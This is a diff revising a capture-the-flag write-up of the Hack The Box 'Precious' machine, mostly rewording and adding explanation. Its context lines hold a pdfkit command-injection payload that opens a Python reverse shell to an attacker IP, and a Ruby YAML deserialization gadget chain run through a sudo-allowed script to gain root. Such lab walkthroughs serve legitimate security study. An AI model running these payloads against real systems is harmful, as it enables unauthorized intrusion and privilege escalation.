@@ -28,13 +28,13 @@ curl http://10.10.11.189:80/ -L
 curl: (6) Could not resolve host: precious.htb
 ```
 
-The attacker machine is not able to resolve the local hostname for the redirect:
+The attacker machine is not able to resolve the local hostname for the redirect. We can add it to the /etc/hosts file:
 ```
 vim /etc/hosts
 10.10.11.189    precious.htb
 ```
 
-The web application will process the passed URL and generate a PDF accordingly.
+The web application will process the passed URL and generate a PDF according to the web page.
 
 It can be possible to weaponize this by hosting a Python local web server and redirect the URL to the attacker's payload.
 
@@ -66,7 +66,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.11.189 - - [11/May/2023 13:28:38] "GET /payload.sh HTTP/1.1" 200 -
 ```
 
-The web application generates a PDF containing the content of the file downloaded. If we check the content of the PDF, we can get more information about the pdfkit software used:
+The web application generates a PDF containing the content of the file downloaded. If we check inside of the PDF, we can get more information about the pdfkit software used:
 ```
  cat yncynx8ds9if3xihyzzej7dfvjsojktg.pdf
  
@@ -85,7 +85,7 @@ The web application generates a PDF containing the content of the file downloade
 The version used is affected by a command injection vulnerability:
 https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
 
-The original attack vector can now be replaced with directly launching a reverse shell from the target to the attacker machine. We can generate a payload to exploit the flaw in the web application:
+The original attack vector can now be replaced by launching a reverse shell directly from the target to the attacker machine. We can generate a payload to exploit the flaw in the web application:
 ```
 http://example.com/?name=#{'%20`export RHOST="10.10.14.39";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'`'}
 ```
@@ -144,7 +144,7 @@ bash-5.1$ cat user.txt
 b7da17f8f92a7e02a6b4489d3433f7b1
 ```
 
-By checking the sudo permissions for the user henry, we can see he is able to launch an elevated command from the ruby binary by passing a script as an argument without root password:
+By checking the sudo permissions for the user henry, we can see he is able to launch an elevated command with the ruby binary by passing a script as an argument without the root password:
 ```
 bash-5.1$ sudo -l
 
@@ -156,7 +156,7 @@ User henry may run the following commands on precious:
     (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
 ```
 
-By looking at the script, we can see that it will load a YAML file that we can provide:
+By looking at the script, we can see that it will load a YAML file that we can manipulate:
 ```rb
 # Compare installed dependencies with those specified in "dependencies.yml"
 require "yaml"
@@ -190,6 +190,17 @@ gems_file.each do |file_name, file_version|
 end
 ```
 
+By searching ruby exploits with the YAML.load deserialization vulnerability, we can see that we can gain remote code execution by supplying our own YAML.
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md
+
+We can check the version of ruby installed on the box to scope the exploit:
+```
+-bash-5.1$ ruby --version
+ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
+```
+
+To test the exploitability, we can start by creating a dependencies.yml file with the id command:
 ```yml
 ---
 - !ruby/object:Gem::Installer
@@ -210,11 +221,9 @@ end
                  method_id: :system
              git_set: id
          method_id: :resolve
-
 ```
 
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md
-
+From the output, we can see that the id command was successfully executed:
 ```
 henry@precious:/tmp$ sudo /usr/bin/ruby /opt/update_dependencies.rb
 sh: 1: reading: not found
@@ -256,6 +265,7 @@ Traceback (most recent call last):
 /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
 ```
 
+We can now weaponize this exploit to gain a shell with root privileges:
 ```
 ---
 - !ruby/object:Gem::Installer
@@ -278,6 +288,7 @@ Traceback (most recent call last):
          method_id: :resolve
 ```
 
+We now have root access to the box through this flaw:
 ```
 henry@precious:/tmp$ sudo /usr/bin/ruby /opt/update_dependencies.rb
 sh: 1: reading: not found
